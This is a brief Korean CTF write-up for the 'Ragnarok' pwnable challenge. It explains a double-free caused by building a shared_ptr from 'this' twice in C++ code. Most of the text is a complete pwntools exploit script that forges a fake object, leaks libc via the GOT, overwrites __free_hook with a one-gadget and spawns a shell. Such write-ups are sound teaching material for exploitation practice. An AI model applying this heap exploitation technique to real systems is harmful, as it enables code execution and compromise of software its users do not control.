Ragnarok (Solver : 5)
=============

### 1. Introduction

| RELRO     | STACK CANARY | NX         | PIE    | RPATH    | RUNPATH    | FILE           |
|-----------|--------------|------------|--------|----------|------------|----------------|
| Full RELRO| Canary found | NX enabled | No PIE | No RPATH | No RUNPATH | ragnarok.bin   | 

요즘 읽는중인 전문가를 위한 C++에 나와있는 더블프리 케이스에 정확히 맞는 문제였다. 고스트파티도 그렇고 C++ 문제는 코딩실수로 발생될 수 있는 취약점에서 문제가 잘 나오는거 같다.

### 2. Vulnerability

```c++
if(!weapon.compare("Gungnir")){
  add_mp(1600);
  cast_spell(shared_ptr<Figure>(this));
}
```
위처럼 같은 객체에 shared_ptr을 두번 만들게되면 레퍼런스 카운터는 변하지 않아서 소멸이 두번된다. 그래서 복사생성자를 이용해야한다.

### 3. Exploit
cast_spell(shared_ptr<Figure>(this)) 이부분을 호출만하면 UAF발생. 그 다음부터는 쉬우므로 생략하겠다.

```python
from ntpwn import *

e = ELF('./ragnarok')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def connect():
	#s = process('./a.out')
	s = process('./ragnarok')
	b = BP(s)
	b.bp('tracemalloc on')
	b.bp64(0x289c)
	b.bp('c')
	b.done()
	return s

def choose(idx):
	s.sendlineafter(':','1')
	s.sendlineafter(':',idx)

def show_info():
	s.sendlineafter(':','2')

def earn(money):
	charset = {68 : 'h', 49 : 'i', 50 : 't', 43 : 'c', 46 : 'o', 55 : 'n'}
	my_money = 0
	count = 0

	s.sendlineafter(':','3')
	u_log = log.progress("GET MONEY (" + str(money) + ")")
	while my_money < (money + 1000):
		s.recvuntil('*' * 27 + '\n')
		data = s.recvuntil('*' * 27)[:-29]
		s.sendlineafter(':', charset[len("".join(data.replace(' ','A').split()[:-1]))])
		s.recvuntil('Your money :')
		my_money = int(s.recvline())
		count += 1
		u_log.status(str(count))

	u_log.success("Good!")
	s.sendlineafter(':','H')

def winFreyr(name):
	s.sendlineafter('choice :','5')
	s.sendlineafter('choice :','3')
	s.sendlineafter('Target :','1')
	s.sendlineafter('choice :','3')
	s.sendlineafter('Target :','1')
	s.recvuntil('!' * 30, timeout=2)
	s.recvuntil('!',timeout=0.3)
	if -1 == s.recvuntil('!', timeout=0.3).find('You win !'):
		return -1

	s.sendlineafter('Name :',name)
	return 0

def diedFreyr():
	s.sendlineafter('choice :','5')
	s.sendlineafter('choice :','1')
	while s.recvuntil('choice :',timeout=0.3) != '':
		s.sendline('1')
	s.sendlineafter('0:No/1:Yes)','1')

def weapon(name):
	s.sendlineafter('choice :','4')
	s.sendlineafter(':',name)

def description(desc):
	s.sendlineafter('choice :','6')
	s.sendlineafter(':',desc)

def main():
	global s
	while True:
		s = connect()
		choose('3')
		if winFreyr('N'):
			s.close()
			continue
		break

	diedFreyr()
	choose('1')
	earn(133700)
	weapon('Gungnir')

	char_ptr = 0x613650
	odin_vtable = 0x40c700

	payload = p64(char_ptr + 0x30)  + p64(0) * 4
	payload += p64(char_ptr)
	payload += p64(odin_vtable)
	# string name
	payload += p64(e.got['rand']) + p64(8) + p64(0) * 2
	# string desc
	payload += p64(char_ptr + 0x50) + p64(30) + p64(100) + p64(0)

	description(payload)

	show_info()
	s.recvuntil('Name : ')
	libc_base = u64(s.recv(6) + "\x00" * 2) - l.symbols['rand']
	oneshot = libc_base + 0xfcc6e
	log.info("LIBC BASE : " + hex(libc_base))

	description('A' * 8 + p64(libc_base + l.symbols['__free_hook']))
	description( p64(oneshot) )

	s.sendlineafter('choice :','3')
	s.sendlineafter(':','N')

	s.interactive()


s = ''
if __name__ == '__main__':
	main()
```
